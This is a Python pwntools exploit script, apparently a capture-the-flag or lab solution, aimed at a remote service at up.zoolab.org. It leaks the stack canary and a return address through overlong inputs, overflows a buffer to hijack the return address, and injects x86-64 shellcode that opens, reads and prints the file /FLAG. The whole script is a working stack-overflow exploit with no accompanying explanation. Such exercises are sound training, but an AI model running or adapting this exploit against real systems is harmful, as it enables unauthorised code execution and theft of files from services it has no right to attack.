from pwn import *

context.arch = 'amd64' 

offset_rbp_to_ret = 0x08
offset_canary_to_rbp = 0x08 
offset_buf1_to_rbp = 0x90
offset_buf2_to_rbp = offset_buf1_to_rbp - 0x30
offset_buf3_to_rbp = offset_buf2_to_rbp - 0x30

offset_leak_to_shellcode = 0xE5564 

io = remote("up.zoolab.org", 12343)

# Leak Canary 
io.recvuntil(b"What's your name? ") 
canary_pad_len = offset_buf1_to_rbp - offset_canary_to_rbp
canary_pad_bytes = b"X" * canary_pad_len
io.sendline(canary_pad_bytes)

io.recvline() 
leaked_canary_line = io.recvline(keepends=False)
leaked_canary_fragment = leaked_canary_line[:7]

full_canary_bytes = b"\x00" + leaked_canary_fragment
leaked_canary_val = u64(full_canary_bytes) 

# Leak Return Address
io.recvuntil(b"What's the room number? ")
ret_addr_pad_len = offset_buf2_to_rbp + offset_rbp_to_ret - 1
ret_addr_pad_bytes = b"Y" * ret_addr_pad_len
io.sendline(ret_addr_pad_bytes)

io.recvline() 
leaked_ret_addr_line = io.recvline(keepends=False)
leaked_ret_addr_fragment = leaked_ret_addr_line[:8] 

full_ret_addr_bytes = leaked_ret_addr_fragment.ljust(8, b'\x00')
leaked_ret_addr = u64(full_ret_addr_bytes) 

# Calculate shellcode target address
shellcode_addr = leaked_ret_addr + offset_leak_to_shellcode 

# Overflow 
io.recvuntil(b"What's the customer's name? ") 
overflow_pad_len = offset_buf3_to_rbp - offset_canary_to_rbp
exploit_payload = b"Z" * overflow_pad_len 
exploit_payload += p64(leaked_canary_val)
exploit_payload += b"W" * offset_rbp_to_ret 
exploit_payload += p64(shellcode_addr)
io.sendline(exploit_payload) 

shellcode = """
    lea rdi, [rip+flag_str]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall         /* open */

    mov edi, eax
    lea rsi, [rip+fbuf]
    mov edx, 100
    xor eax, eax
    syscall         /* read */

    mov edx, eax
    mov edi, 1
    lea rsi, [rip+fbuf]
    mov eax, 1
    syscall         /* write */

    xor edi, edi
    mov eax, 60
    syscall         /* exit */

flag_str: .asciz "/FLAG"
fbuf:     .space 128
"""

actual_shellcode = asm(shellcode)
io.sendafter(b"Leave your message: ", actual_shellcode)
io.recvuntil(b"Thank you!\n") 

flag_data = io.recvall()
print(flag_data) 

io.close()